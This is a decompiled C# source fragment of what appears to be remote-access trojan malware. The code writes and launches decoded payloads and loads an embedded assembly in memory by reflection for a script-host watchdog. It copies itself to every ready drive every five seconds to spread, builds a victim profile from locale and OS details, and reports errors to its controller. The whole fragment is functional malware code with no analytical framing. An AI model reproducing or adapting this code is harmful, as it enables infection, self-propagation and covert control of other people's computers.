          byte[] B = O.FDE(Conversions.ToString(NewLateBinding.LateIndexGet((object) Instance1, new object[1]
          {
            (object) 1
          }, (string[]) null)));
          bool flag = false;
          ref bool local = ref flag;
          byte[] bytes = O.ZIP(B, ref local);
          File.WriteAllBytes(path, bytes);
          Process.Start(new ProcessStartInfo()
          {
            FileName = str,
            Arguments = "!0@" + O.ep() + "@" + O.SU + "@" + Conversions.ToString(Process.GetCurrentProcess().Id)
          });
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception = ex;
        string[] strArray1 = new string[6]
        {
          "#10",
          O.ST[1],
          "^",
          Conversions.ToString(0),
          O.ST[1],
          null
        };
        string[] strArray2 = strArray1;
        string message = exception.Message;
        string str = O.ENB(ref message);
        strArray2[5] = str;
        string T = string.Concat(strArray1);
        O.SEND(ref T);
        ProjectData.ClearProjectError();
      }
    }

    public static BackgroundWorker B
    {
      get => O._B;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DoWorkEventHandler workEventHandler = (DoWorkEventHandler) ((a0, a1) => O.D());
        if (O._B != null)
          O._B.DoWork -= workEventHandler;
        O._B = value;
        if (O._B == null)
          return;
        O._B.DoWork += workEventHandler;
      }
    }

    public static void D()
    {
      byte[] p = nv.My.Resources.Resources.P;
      bool flag = false;
      ref bool local1 = ref flag;
      byte[] numArray = O.ZIP(p, ref local1);
label_1:
      try
      {
        File.WriteAllText(O.u, O.z);
        O.fj.StartInfo.FileName = O.u;
        O.fj.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
label_4:
      try
      {
        ref byte[] local2 = ref numArray;
        string str1 = "P.V";
        ref string local3 = ref str1;
        string str2 = "FWD";
        ref string local4 = ref str2;
        object obj1 = (object) new object[1]
        {
          (object) "Windows Script Host"
        };
        ref object local5 = ref obj1;
        int integer = Conversions.ToInteger(O.inv(ref local2, ref local3, ref local4, ref local5));
        ref byte[] local6 = ref numArray;
        string str3 = "P.V";
        ref string local7 = ref str3;
        string str4 = "Iswd";
        ref string local8 = ref str4;
        object obj2 = (object) new object[1]
        {
          (object) integer
        };
        ref object local9 = ref obj2;
        if (Operators.ConditionalCompareObjectEqual(O.inv(ref local6, ref local7, ref local8, ref local9), (object) 1, false))
        {
          try
          {
            O.fj.Kill();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      Thread.Sleep(100);
      try
      {
        if (!O.fj.WaitForExit(100))
          goto label_4;
        else
          goto label_1;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void USb(string S)
    {
      while (true)
      {
        Thread.Sleep(5000);
        try
        {
          DriveInfo[] drives = DriveInfo.GetDrives();
          int index = 0;
          while (index < drives.Length)
          {
            DriveInfo driveInfo = drives[index];
            if (driveInfo.IsReady)
            {
              if (driveInfo.TotalFreeSpace > 0L)
              {
                try
                {
                  File.Copy(O.ep(), driveInfo.Name + S, true);
                  File.SetAttributes(driveInfo.Name + S, FileAttributes.Normal);
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  ProjectData.ClearProjectError();
                }
              }
            }
            checked { ++index; }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    public static object inv(ref byte[] F, ref string C, ref string S, ref object P)
    {
      Assembly assembly = Assembly.Load(F);
      return assembly.GetType(C).GetMethod(S).Invoke(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Activator.CreateInstance(assembly.GetType(C)))), (object[]) P);
    }

    public static byte[] ZIP(byte[] B, ref bool CM)
    {
      if (CM)
      {
        MemoryStream memoryStream = new MemoryStream();
        GZipStream gzipStream = new GZipStream((Stream) memoryStream, CompressionMode.Compress, true);
        gzipStream.Write(B, 0, B.Length);
        gzipStream.Dispose();
        memoryStream.Position = 0L;
        byte[] buffer = new byte[checked ((int) memoryStream.Length + 1)];
        memoryStream.Read(buffer, 0, buffer.Length);
        memoryStream.Dispose();
        return buffer;
      }
      MemoryStream memoryStream1 = new MemoryStream(B);
      GZipStream gzipStream1 = new GZipStream((Stream) memoryStream1, CompressionMode.Decompress);
      byte[] buffer1 = new byte[4];
      memoryStream1.Position = checked (memoryStream1.Length - 5L);
      memoryStream1.Read(buffer1, 0, 4);
      int int32 = BitConverter.ToInt32(buffer1, 0);
      memoryStream1.Position = 0L;
      byte[] array = new byte[checked (int32 - 1 + 1)];
      gzipStream1.Read(array, 0, int32);
      gzipStream1.Dispose();
      memoryStream1.Dispose();
      return array;
    }

    public static byte[] FDE(string B) => Convert.FromBase64String(B);

    public static string ENB(ref string s) => Convert.ToBase64String(Encoding.UTF8.GetBytes(s));

    public static string DEB(ref string s) => Encoding.UTF8.GetString(Convert.FromBase64String(s));

    [DllImport("kernel32.dll")]
    private static extern int GetLocaleInfo(
      uint Locale,
      uint LCType,
      [Out] StringBuilder lpLCData,
      int cchData);

    private static string Gcc(uint lInfo)
    {
      StringBuilder lpLCData = new StringBuilder(256);
      int localeInfo = O.GetLocaleInfo(1024U, lInfo, lpLCData, lpLCData.Capacity);
      return localeInfo > 0 ? lpLCData.ToString().Substring(0, checked (localeInfo - 1)) : string.Empty;
    }

    public static string Gc() => O.Gcc(7U);

    public static string A0()
    {
      RegistryProxy registry = MyProject.Computer.Registry;
      string str1 = O.ST[3] + "\r\n";
      string str2;
      try
      {
        str2 = str1 + O.Gc() + "\r\n";
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str2 = str1 + "X\r\n";
        ProjectData.ClearProjectError();
      }
      string str3;
      try
      {
        str3 = str2 + MyProject.Computer.Info.OSFullName + "\r\n";
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str3 = str2 + "X\r\n";
        ProjectData.ClearProjectError();
      }
      string Expression = str3 + "..\r\n" + O.ST[4];
      string str4;
      try
      {
        str4 = Strings.Replace(Strings.Replace(Strings.Replace(Expression, "Microsoft", ""), "Windows", "Win").Replace("®", "").Replace("™", ""), "  ", " ");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str4 = Expression + "X\r\n";
        ProjectData.ClearProjectError();
      }
      return str4 + "\r\n \r\nNo Plugin";
    }
  }
}
